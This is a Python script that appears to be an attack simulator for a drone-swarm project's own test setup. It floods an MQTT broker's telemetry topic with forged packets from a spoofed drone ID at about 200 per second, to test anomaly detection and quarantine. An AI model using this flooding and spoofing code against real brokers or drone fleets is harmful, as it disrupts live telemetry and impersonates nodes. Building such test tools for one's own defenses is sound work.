"""
flooding_attack.py — High-Rate DoS Telemetry Flooding Attack Simulator
======================================================================
Floods the swarm telemetry topic with bursts of 200+ packets/sec to test:
- High RPS anomaly detection
- Throughput saturation resilience
- Automatic trust penalty and rate-limit quarantine
"""

import sys
import os
import time
import json
import argparse

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

import paho.mqtt.client as mqtt
from protocol import MessageType, SwarmPacket


def main():
    parser = argparse.ArgumentParser(description="Swarm DoS Flooding Attack Simulator")
    parser.add_argument("--broker", type=str, default="127.0.0.1", help="Target MQTT broker IP")
    parser.add_argument("--port", type=int, default=1883, help="Target MQTT broker port")
    parser.add_argument("--attacker-id", type=str, default="drone_2", help="Attacker drone ID (e.g. drone_2)")
    parser.add_argument("--target-drone", type=str, default="drone_3", help="Target victim drone (e.g. drone_3)")
    parser.add_argument("--count", type=int, default=300, help="Number of packets to flood")
    args = parser.parse_args()

    try:
        from paho.mqtt.enums import CallbackAPIVersion
        client = mqtt.Client(CallbackAPIVersion.VERSION2, client_id=f"flooder_{int(time.time())}")
    except Exception:
        client = mqtt.Client(client_id=f"flooder_{int(time.time())}")
    client.connect(args.broker, args.port, keepalive=60)
    client.loop_start()

    print("=" * 70)
    print(f"[*] LAUNCHING HIGH-RATE DoS FLOODING ATTACK ({args.count} packets)")
    print(f"[*] Target Broker : {args.broker}:{args.port}")
    print(f"[*] Attacker Node : {args.attacker_id}")
    print(f"[*] Target Victim : {args.target_drone}")
    print("=" * 70)

    topic = f"swarm/pqc/{args.target_drone}/telemetry"
    t_start = time.time()

    for seq in range(args.count):
        telem = {
            "drone_id": args.attacker_id,
            "lat": 16.792406,
            "lon": 80.819767,
            "alt": 5.0,
            "voltage": 11.5,
            "seq": 500000 + seq
        }
        pkt = SwarmPacket(
            msg_type=MessageType.PQC_ENCRYPTED_TELEMETRY,
            sender_id=args.attacker_id,
            payload={"plain_discovery": telem},
            sequence_num=500000 + seq
        )
        client.publish(topic, pkt.serialize(), qos=0)
        time.sleep(0.005)  # ~200 pkts/sec

    duration = time.time() - t_start
    rps = args.count / max(0.001, duration)
    print(f"\n[*] Flooding complete: Sent {args.count} packets in {duration:.2f}s ({rps:.1f} pkts/sec)")

    client.loop_stop()
    client.disconnect()


if __name__ == "__main__":
    main()
